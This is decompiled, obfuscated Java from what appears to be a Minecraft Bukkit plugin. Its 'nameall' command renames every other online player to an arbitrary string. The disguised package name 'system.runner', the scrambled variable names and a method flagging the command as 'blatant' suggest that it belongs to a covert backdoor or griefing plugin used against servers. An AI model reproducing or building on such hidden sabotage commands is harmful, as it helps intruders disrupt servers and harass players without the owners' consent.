/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.ChatColor
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class NameallCommand
extends Command {
    @Override
    public void execute(Core llllllllllllllllIIIllIIIIIIIlIlI, String llllllllllllllllIIIllIIIIIIIlIIl, String[] llllllllllllllllIIIllIIIIIIIIllI, Player llllllllllllllllIIIllIIIIIIIIlIl) {
        if (llllllllllllllllIIIllIIIIIIIIllI.length <= 1) {
            llllllllllllllllIIIllIIIIIIIIlIl.sendMessage(Settings.USAGE("nameall <name>"));
        } else {
            StringBuilder llllllllllllllllIIIllIIIIIIIllII = new StringBuilder();
            for (int llllllllllllllllIIIllIIIIIIIlllI = 1; llllllllllllllllIIIllIIIIIIIlllI != llllllllllllllllIIIllIIIIIIIIllI.length; ++llllllllllllllllIIIllIIIIIIIlllI) {
                llllllllllllllllIIIllIIIIIIIllII.append(llllllllllllllllIIIllIIIIIIIIllI[llllllllllllllllIIIllIIIIIIIlllI]).append(" ");
            }
            llllllllllllllllIIIllIIIIIIIllII = new StringBuilder(ChatColor.translateAlternateColorCodes((char)'&', (String)String.valueOf(llllllllllllllllIIIllIIIIIIIllII)));
            for (Player llllllllllllllllIIIllIIIIIIIllIl : Bukkit.getOnlinePlayers()) {
                if (llllllllllllllllIIIllIIIIIIIllIl.getName().equals(llllllllllllllllIIIllIIIIIIIIlIl.getName())) continue;
                llllllllllllllllIIIllIIIIIIIllIl.setDisplayName(String.valueOf(llllllllllllllllIIIllIIIIIIIllII));
                llllllllllllllllIIIllIIIIIIIllIl.setCustomName(String.valueOf(llllllllllllllllIIIllIIIIIIIllII));
                llllllllllllllllIIIllIIIIIIIllIl.setPlayerListName(String.valueOf(llllllllllllllllIIIllIIIIIIIllII));
                llllllllllllllllIIIllIIIIIIIllIl.setCustomNameVisible(true);
            }
            llllllllllllllllIIIllIIIIIIIIlIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("Everyone's nickname is now ").append(Settings.RED).append((Object)llllllllllllllllIIIllIIIIIIIllII))));
        }
    }

    public NameallCommand() {
        NameallCommand llllllllllllllllIIIllIIIIIIlIlII;
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

